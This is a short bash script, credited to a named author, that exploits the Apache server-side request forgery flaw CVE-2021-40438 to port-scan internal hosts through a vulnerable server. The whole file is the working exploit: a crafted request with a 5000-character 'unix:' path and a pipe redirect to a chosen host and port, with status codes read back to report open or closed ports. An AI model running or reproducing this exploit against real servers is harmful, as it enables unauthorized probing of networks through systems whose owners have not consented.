# By Jorge Moya (vsh00t) @Jim0ya
# Script for port scanning through vulnerable servers CVE-2021-40438 
#!/bin/bash
#### Set vulnerable host https://hostname
host="" 

rhost="http://$3"

while getopts "p:" opt; do
set -f; IFS=','
numarr=($2)
case $opt in
p ) port=
i=0
j=1
echo "Scanning..."
while [ $j -le ${#numarr[@]} ]
do
  port=${numarr[$i]}
#  echo $port
  HTTP_CODE=$(curl --max-time 10 --connect-timeout 2 --retry 0 -S -s --silent --output /dev/null --write-out "%{http_code}\n" "$host/\?unix:$(python3 -c 'print("A"*5000)')|$rhost:$port" 2>/dev/null)
#echo $HTTP_CODE
	if [ $HTTP_CODE == 502 ] || [ $HTTP_CODE == 200 ] || [ $HTTP_CODE == 404 ]
		then
		echo "[*] Port [$port] open"	
	else
		echo "[-] Port [$port] closed"
	fi

  ((i++))
  ((j++))
done;;
* ) echo "uso: ./scan_ssrf.sh -p <port1,port2,port3...> <host>"

exit 1
esac
done
